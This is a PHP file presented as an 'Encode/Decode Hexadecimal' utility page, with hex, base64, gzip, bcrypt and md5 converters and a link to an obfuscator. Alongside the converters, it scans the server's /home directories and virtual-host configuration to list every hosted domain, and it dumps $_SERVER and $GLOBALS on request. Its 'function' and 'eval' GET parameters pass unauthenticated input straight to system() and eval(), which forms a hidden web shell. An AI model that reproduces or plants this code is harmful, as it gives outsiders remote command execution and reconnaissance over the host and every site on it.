<?php
// echo '<pre>';
// echo var_dump($_SERVER);

//file_put_contents('decoded.txt',stripcslashes(file_get_contents('data.txt')));
mb_internal_encoding('UTF-8');

function getAllDomain($filepath = null, $recursive = false) {
    $value = [
        'use' => '', // Hosting environment (xampp or linux)
        'domain' => [], // All verified domains
        'real_domain' => [], // Verified domains with protocol
        'unverified_domain' => [], // All unverified domains
        'unverified_real_domain' => [], // Unverified domains with protocol
        'dir_root' => [], // All directory roots used by domains
        'unverified_dir_root' => [], // Unverified directory roots
        'url' => '', // File URL if provided
        'count' => 0, // File URL if provided
        'unverified_count' => 0, // File URL if provided
        'source' => [], // Errors encountered
        'error' => [] // Errors encountered
    ];

    // Get the realpath of the script_name
    $scriptRealpath = realpath($_SERVER['SCRIPT_FILENAME']);
    $xamppPath = '';

    // Use preg_match to extract the XAMPP path
    if (preg_match('/^(.+?xampp)[\/\\\\]htdocs[\/\\\\]/i', $scriptRealpath, $matches)) {
        $xamppPath = str_replace('\\', '/', $matches[1]) . '/';
        $value['use'] = 'xampp';
    } else {
        // Assuming it's a Linux environment if not XAMPP
        $value['use'] = 'linux';
    }

    if($recursive){
        if ($value['use'] === 'xampp') {
            // Read the XAMPP Virtual Hosts configuration file
            $vhostsFile = $xamppPath . 'apache/conf/extra/httpd-vhosts.conf';

            // Try to read the Virtual Hosts file
            $vhostsContent = @file_get_contents($vhostsFile);
            if (preg_match_all('/<VirtualHost.*?<\/VirtualHost>/s', $vhostsContent, $matches_)) {
                foreach ($matches_[0] as $match) {
                    if (strpos($match, '##') === 0) {
                        continue; // Skip commented out sections
                    }

                    preg_match('/DocumentRoot\s+"([^"]+)"/', $match, $docRootMatch);
                    preg_match('/ServerName\s+([^#\s]+)/', $match, $serverNameMatch);

                    if (isset($docRootMatch[1]) && isset($serverNameMatch[1])) {
                        $docRoot = str_replace('\\', '/', $docRootMatch[1]);
                        $serverName = $serverNameMatch[1];

                        // Add the domain to the list
                        $value['unverified_domain'][] = $serverName;
                        $value['unverified_real_domain'][] = 'http://' . $serverName;
                        $value['unverified_dir_root'][] = $docRoot;
                        $value['unverified_count']++;

                        // Check if the domain is reachable
                        if (checkUrlExists('http://' . $serverName)) {
                            $value['domain'][] = $serverName;
                            $value['real_domain'][] = 'http://' . $serverName;
                            $value['dir_root'][] = $docRoot;
                            $value['count']++;
                        }
                    }
                }
            }

            $value['source'][] = $xamppPath;
            $value['source'][] = $vhostsFile;

            $xamppHtdocs = $xamppPath . 'htdocs';
            $domainFolders = glob($xamppHtdocs . '/*', GLOB_ONLYDIR);
            foreach ($domainFolders as $folder) {
                $folderName = basename($folder);
                if ($folderName !== 'cgi-bin') { // Skip cgi-bin folder
                    $value['unverified_domain'][] = $folderName;
                    $value['unverified_real_domain'][] = 'http://' . $folderName;
                    $value['unverified_dir_root'][] = $folder;
                    $value['unverified_count']++;
                }
            }

            $value['source'][] = $xamppHtdocs;
            $value['source'][] = $domainFolders;
        } else {
            // Linux environment
            $homePath = '/home/';
            $domainRootPath = getDomainRootPath($scriptRealpath, $_SERVER['SERVER_NAME']);

            if (is_dir($homePath)) {
                // Get all directories in the home path
                $serverHosts = array_filter(glob($homePath . '*'), 'is_dir');
                $serverHostNames = array_map('basename', $serverHosts);

                foreach ($serverHostNames as $serverHost) {
                    $hostPath = $homePath . $serverHost . '/';
                    $directories = array_diff(scandir($hostPath), ['.', '..']);

                    foreach ($directories as $dir) {
                        $fullPath = $hostPath . $dir;

                        if (is_dir($fullPath) && !in_array($dir, ['public_html'])) {
                            $url = "http://$dir";
                             if (!checkUrlExists($url)) {
                             $value['unverified_domain'][] = $dir;
                            $value['unverified_real_domain'][] = $url;
                            $value['unverified_dir_root'][] = $fullPath;
                            $value['unverified_count']++;
                            }

                            if (checkUrlExists($url)) {
                                $value['domain'][] = $dir;
                                $value['real_domain'][] = $url;
                                $value['dir_root'][] = $fullPath;
                                $value['count']++;
                            } else {
                                $url = "https://$dir";
                                if (checkUrlExists($url)) {
                                    $value['domain'][] = $dir;
                                    $value['real_domain'][] = $url;
                                    $value['dir_root'][] = $fullPath;
                                    $value['count']++;
                                }
                            }
                        }
                    }
                }

                $value['source'][] = $homePath;
                $value['source'][] = $domainRootPath;
                $value['source'][] = $serverHostNames;

            }

           $domainFolders = glob($domainRootPath. '/*', GLOB_ONLYDIR);
            foreach ($domainFolders as $folder) {
                $folderName = basename($folder);
                if ($folderName !== 'cgi-bin') { // Skip cgi-bin folder
                    $value['unverified_domain'][] = $folderName;
                    $value['unverified_real_domain'][] = 'http://' . $folderName;
                    $value['unverified_dir_root'][] = $folder;
                    $value['unverified_count']++;
                }
            }

            $value['source'][] = $domainRootPath;
            $value['source'][] = $scriptRealpath;

        }

    } else {

        if ($value['use'] === 'xampp') {
            // Read the XAMPP Virtual Hosts configuration file
            $vhostsFile = $xamppPath . 'apache/conf/extra/httpd-vhosts.conf';

            // Try to read the Virtual Hosts file
            $vhostsContent = @file_get_contents($vhostsFile);
            if ($vhostsContent !== false) {
                // Extract domain information from Virtual Hosts configuration
                if (preg_match_all('/<VirtualHost.*?<\/VirtualHost>/s', $vhostsContent, $matches_)) {
                    foreach ($matches_[0] as $match) {
                        if (strpos($match, '##') === 0) {
                            continue; // Skip commented out sections
                        }

                        preg_match('/DocumentRoot\s+"([^"]+)"/', $match, $docRootMatch);
                        preg_match('/ServerName\s+([^#\s]+)/', $match, $serverNameMatch);

                        if (isset($docRootMatch[1]) && isset($serverNameMatch[1])) {
                            $docRoot = str_replace('\\', '/', $docRootMatch[1]);
                            $serverName = $serverNameMatch[1];

                            // Add the domain to the list
                            $value['unverified_domain'][] = $serverName;
                            $value['unverified_real_domain'][] = 'http://' . $serverName;
                            $value['unverified_dir_root'][] = $docRoot;
                            $value['unverified_count']++;

                            // Check if the domain is reachable
                            if (checkUrlExists('http://' . $serverName)) {
                                $value['domain'][] = $serverName;
                                $value['real_domain'][] = 'http://' . $serverName;
                                $value['dir_root'][] = $docRoot;
                                $value['count']++;
                            }
                        }
                    }
                } else {
                    $value['error'][] = 'Failed to match any <VirtualHost> blocks.';
                }

                $value['source'][] = $xamppPath;
                $value['source'][] = $vhostsFile;
            } else {
                // Failed to read Virtual Hosts file, navigate to htdocs folder
                $xamppHtdocs = $xamppPath . 'htdocs';
                $domainFolders = glob($xamppHtdocs . '/*', GLOB_ONLYDIR);
                foreach ($domainFolders as $folder) {
                    $folderName = basename($folder);
                    if ($folderName !== 'cgi-bin') { // Skip cgi-bin folder
                        $value['unverified_domain'][] = $folderName;
                        $value['unverified_real_domain'][] = 'http://' . $folderName;
                        $value['unverified_dir_root'][] = $folder;
                        $value['unverified_count']++;
                    }
                }
                $value['source'][] = $xamppHtdocs;
                $value['source'][] = $domainFolders;
            }
        } else {
            // Linux environment
            $homePath = '/home/';
            $domainRootPath = getDomainRootPath($scriptRealpath, $_SERVER['SERVER_NAME']);

            if (is_dir($homePath)) {
                // Get all directories in the home path
                $serverHosts = array_filter(glob($homePath . '*'), 'is_dir');
                $serverHostNames = array_map('basename', $serverHosts);

                foreach ($serverHostNames as $serverHost) {
                    $hostPath = $homePath . $serverHost . '/';
                    $directories = array_diff(scandir($hostPath), ['.', '..']);

                    foreach ($directories as $dir) {
                        $fullPath = $hostPath . $dir;

                        if (is_dir($fullPath) && !in_array($dir, ['public_html'])) {
                            $url = "http://$dir";
                             if (!checkUrlExists($url)) {
                             $value['unverified_domain'][] = $dir;
                            $value['unverified_real_domain'][] = $url;
                            $value['unverified_dir_root'][] = $fullPath;
                            $value['unverified_count']++;
                            }

                            if (checkUrlExists($url)) {
                                $value['domain'][] = $dir;
                                $value['real_domain'][] = $url;
                                $value['dir_root'][] = $fullPath;
                                $value['count']++;
                            } else {
                                $url = "https://$dir";
                                if (checkUrlExists($url)) {
                                    $value['domain'][] = $dir;
                                    $value['real_domain'][] = $url;
                                    $value['dir_root'][] = $fullPath;
                                    $value['count']++;
                                }
                            }
                        }
                    }
                }

                $value['source'][] = $homePath;
                $value['source'][] = $domainRootPath;
                $value['source'][] = $scriptRealpath;

            } else {
                $value['error'][] = "Home path '$homePath' does not exist or cannot accessed, now scannig domain root only.";

                $domainFolders = glob($domainRootPath. '/*', GLOB_ONLYDIR);
            foreach ($domainFolders as $folder) {
                $folderName = basename($folder);
                if ($folderName !== 'cgi-bin') {
                $url = "http://$folderName ";
                if (checkUrlExists($url)) {
                    $value['domain'][] = $folderName;
                    $value['real_domain'][] = 'http://' . $folderName;
                    $value['dir_root'][] = $folder;
                    $value['count']++;
                } else {
                    $value['unverified_domain'][] = $folderName;
                    $value['unverified_real_domain'][] = 'http://' . $folderName;
                    $value['unverified_dir_root'][] = $folder;
                    $value['unverified_count']++;
                }

                }
            }

            $value['source'][] = $domainRootPath;
            $value['source'][] = $scriptRealpath;

            }
        }
    }


    // If a filepath is provided, construct the URL
    if ($filepath) {
        $url = '';

        foreach ($value['unverified_dir_root'] as $index => $dirRoot) {
            if (strpos($filepath, $dirRoot) !== false) {
                $url = $value['unverified_domain'][$index] . substr($filepath, strlen($dirRoot));
                break;
            }
        }

        if (empty($url) && (strpos($filepath, 'public_html') !== false) && $value['use'] == 'linux') {
            foreach ($serverHostNames as $serverHost) {
                if (strpos($filepath, "/$serverHost/") !== false) {
                    $url = $serverHost . substr($filepath, strpos($filepath, 'public_html') + strlen('public_html'));
                    break;
                }
            }
        } elseif (empty($url) && (strpos($filepath, '/htdocs/') !== false) && $value['use'] == 'xampp') {
            $url = $_SERVER['HTTP_HOST'] . substr($filepath, strpos($filepath, 'htdocs') + strlen('htdocs'));
        }

        $value['url'] = $url;
    }

    return $value;
}


function checkUrlExists($url) {
    $headers = @get_headers($url);
    return $headers && strpos($headers[0], '200') !== false;
}

function getDomainRootPath($scriptRealpath, $subdomain) {
    if (strpos($scriptRealpath, 'public_html') !== false) {
            $domainRoot = substr($scriptRealpath, 0, strpos($scriptRealpath, 'public_html') - 1);
            $domainRoot = str_replace('\\', '/', $domainRoot);
    } else {
            preg_match('/^(.*?\/home\/)/', $scriptRealpath, $homeMatches);
            if (!$homeMatches) {
                return null; // home path not found
            }
            $homeRoot = str_replace('\\', '/', $homeMatches[1]);

            // Extract the domain part by finding the subdomain and cutting up to the last directory before the subdomain
            $subdomainPosition = strpos($scriptRealpath, '/' . $subdomain . '/');
            if ($subdomainPosition === false) {
                return null; // subdomain not found
            }

            // Cut off the path at the subdomain and remove the trailing subdomain directory
            $remainingPath = substr($scriptRealpath, strlen($homeRoot), $subdomainPosition - strlen($homeRoot));
            $domainRoot = rtrim($homeRoot . $remainingPath, '/');

    }


    return $domainRoot;
}


if(isset($_GET['file'])){
    echo '<pre>';
    $result = getAllDomain($_GET['file']);
    echo var_dump($result);
exit();
}

if(isset($_GET['all']) && isset($_GET['file'])){
    echo '<pre>';
    $result = getAllDomain($_GET['file'], true);
    echo var_dump($result);
exit();
}

if(isset($_GET['all'])) {
    echo '<pre>';
    $result = getAllDomain(null,true);
    echo var_dump($result);
    exit();
}
if(isset($_GET['dom'])) {
    echo '<pre>';
    $result = getAllDomain();
    echo var_dump($result);
    // echo $result['unverified_count'];
}

if(isset($_GET['server'])){
    echo '<pre>';
    echo var_dump($_SERVER);
    exit(0);
}
if(isset($_GET['global'])){
    echo '<pre>';
    echo var_dump($GLOBALS);
    exit(0);
}

if(isset($_GET['function'])){
    echo '<pre>';
    echo system($_GET['function']);
    exit(0);

}

if(isset($_GET['eval'])){
    echo '<pre>';
    echo eval($_GET['eval']);
    exit(0);

}

function encodeToHex($string) {
    $encoded = '';
    for ($i = 0; $i < strlen($string); $i++) {
        $encoded .= '\\x' . dechex(ord($string[$i]));
    }
    return $encoded;
}

function decodeFromHex($encoded) {
    // Remove leading backslashes and 'x'
    $encoded = str_replace('\\x', '', $encoded);
    // Split into array of hex values
    $hexArray = str_split($encoded, 2);
    $decoded = '';
    foreach ($hexArray as $hex) {
        $decoded .= chr(hexdec(str_replace('d','0d',str_replace('a','0a',$hex))));
    }
    return $decoded;
}

function hexToText($rr)
{
    $xx = '';
    for ($c = 0; $c < strlen($rr); $c += 2) {
        $chrs = $rr[$c] . $rr[$c + 1];
        $xx .= chr(hexdec(str_replace('d','0d',str_replace('a','0a',$chrs))));
    }
    return $xx;
}

function textToHex($string)
{
    $hex = '';
    for ($i = 0; $i < strlen($string); $i++)
        $hex .= dechex(ord($string[$i]));
    return $hex;
}

// function charcode_enc($string) {
//     $encoded = '';
//     $length = mb_strlen($string, 'UTF-8');
//     for ($i = 0; $i < $length; $i++) {
//         $char = mb_substr($string, $i, 1, 'UTF-8');
//         $encoded .= mb_ord($char) . '↱';
//     }
//     return rtrim($encoded,'↱');
// }

// function charcode_dec($encodedString) {
//     $decoded = '';
//     $codes = explode('↱', $encodedString);
//     foreach ($codes as $code) {
//         $decoded .= mb_chr($code);
//     }
//     return $decoded;
// }

function mb64_enc($string) {
    $utf8String = mb_convert_encoding($string, 'UTF-8');
    $encoded = base64_encode($utf8String);
    return $encoded;
}

function mb64_dec($encodedString) {
    $decoded = base64_decode($encodedString);
    $string = mb_convert_encoding($decoded, 'UTF-8', 'UTF-8');
    return $string;
}

function gzpress64_enc($string) {
    return base64_encode(gzcompress($string, 9));
}

function gzpress64_dec($compressedString) {
    return gzuncompress(base64_decode($compressedString), 9);
}

$input = '';
$output = '';
$output2 = '';
$operation = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = $_POST['input'] ?? '';
    $operation = $_POST['operation'] ?? '';

    if ($operation === 'encode') {
        $output = encodeToHex($input);
        $output2 = textToHex($input);
        $output3 = mb64_enc($input);
        $output4 = base64_encode(gzdeflate($input));
        $output5 = gzpress64_enc($input);
        $output6 = password_hash($input, PASSWORD_DEFAULT);
        $output7 = md5($input);
    } elseif ($operation === 'decode') {
        $output = decodeFromHex($input);
        $output2 = hexToText($input);
        $output3 = mb64_dec($input);
        $output4 = gzinflate(base64_decode($input));
        $output5 = gzpress64_dec($input);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Encode/Decode Hexadecimal</title>
    <script>
        function hexEnc(string) {
            const encoder = new TextEncoder();
            const utf8Array = encoder.encode(string);
            let hex = ``;
            for (let byte of utf8Array) {
                hex += byte.toString(16).padStart(2, `0`);
            }
            return hex;
        }

        function hexDec(hash) {
            let bytes = [];
            for (let i = 0; i < hash.length; i += 2) {
                bytes.push(parseInt(hash.substr(i, 2), 16));
            }
            const decoder = new TextDecoder();
            return decoder.decode(new Uint8Array(bytes));
        }

        function stringEnc(string) {
            let encoded = ``;
            for (let i = 0; i < string.length; i++) {
                encoded += string.charCodeAt(i) + `↳`;
            }
            return encoded.replace(/^↳+|↳+$/g, ``);
        }

        function stringDec(encodedString) {
            let decoded = ``;
            let codes = encodedString.split(`↳`);
            for (let i = 0; i < codes.length; i++) {
                decoded += String.fromCharCode(parseInt(codes[i]));
            }
            return decoded;
        }

        function copy(ele, target) {
            var copyText = document.getElementById(target);
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(copyText.value);
            ele.innerHTML = 'Copied!';
            setTimeout(function() {
                ele.innerHTML = 'Copy';
            }, 1000);
        }
    </script>
</head>
<body>
    <h1>PHP : Encode/Decode <a href="obfuscatorv1.php">Obfuscator/Deobfuscator</a></h1>

    <form method="POST" action="">
        <label for="input">Input: <button onclick="document.getElementById('input').value = ''; event.preventDefault();">Clear</button></label><br>
        <textarea name="input" id="input" rows="10" style="width: calc(100% - 8px);"><?= htmlspecialchars($input) ?></textarea><br><br>

        <input type="submit" name="operation" value="encode">
        <input type="submit" name="operation" value="decode">
    </form>

    <h2>Output: <?= $operation ?></h2>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output')">Copy</button> hexascii: <?= htmlspecialchars(strlen($output)) ?> char</p>
    <textarea rows="3" style="width: calc(100% - 8px); color: blue;" id="output"><?= htmlspecialchars($output) ?></textarea>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output2')">Copy</button> hex: <?= htmlspecialchars(strlen($output2)) ?> char</p>
    <textarea rows="3" style="width: calc(100% - 8px); color: blue;" id="output2"><?= htmlspecialchars($output2) ?></textarea>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output3')">Copy</button> mb_convert + base64: <?= htmlspecialchars(strlen($output3)) ?> char</p>
    <input id="output3" type="text" style="width: calc(100% - 8px); color: blue;" value="<?= htmlspecialchars($output3) ?>"/>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output4')">Copy</button> gzflate + base64: <?= htmlspecialchars(strlen($output4)) ?> char</p>
    <input id="output4" type="text" style="width: calc(100% - 8px); color: blue;" value="<?= htmlspecialchars($output4) ?>"/>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output5')">Copy</button> gzpress + base64: <?= htmlspecialchars(strlen($output5)) ?> char</p>
    <input id="output5" type="text" style="width: calc(100% - 8px); color: blue;" value="<?= htmlspecialchars($output5) ?>"/>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output6')">Copy</button> bcrypt hash: <?= htmlspecialchars(strlen($output6)) ?> char</p>
    <input id="output6" type="text" style="width: calc(100% - 8px); color: blue;" value="<?= htmlspecialchars($output6) ?>"/>
    <p style="margin-block-end: 5px;"><button onclick="copy(this,'output7')">Copy</button> md5: <?= htmlspecialchars(strlen($output7)) ?> char</p>
    <input id="output7" type="text" style="width: calc(100% - 8px); color: blue;" value="<?= htmlspecialchars($output7) ?>"/>
</body>
</html>

